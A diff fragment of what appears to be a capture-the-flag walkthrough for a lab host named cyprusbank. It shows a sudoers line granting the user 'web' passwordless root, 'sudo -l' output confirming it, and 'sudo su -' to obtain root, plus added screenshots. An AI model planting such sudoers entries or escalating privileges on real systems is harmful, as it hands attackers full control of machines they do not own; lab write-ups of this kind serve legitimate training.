@@ -183,13 +183,25 @@ Add this line:
 ```bash
 web ALL=(ALL) NOPASSWD: ALL
 ```
+![image](https://github.com/user-attachments/assets/e48f3828-8ad2-46ac-a0a9-2b4dd0d4ebfb)
 
+```
+web@cyprusbank:~/app$ sudo -l
+Matching Defaults entries for web on cyprusbank:
+    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass
+
+User web may run the following commands on cyprusbank:
+    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
+    (ALL) NOPASSWD: ALL
+```
 
 Get root:
 
 ```bash
 sudo su -
 ```
+![Screenshot From 2025-05-12 21-18-11 - Edited](https://github.com/user-attachments/assets/890e3b8c-712e-4132-addc-eee6e519bf10)
 
 ---
 
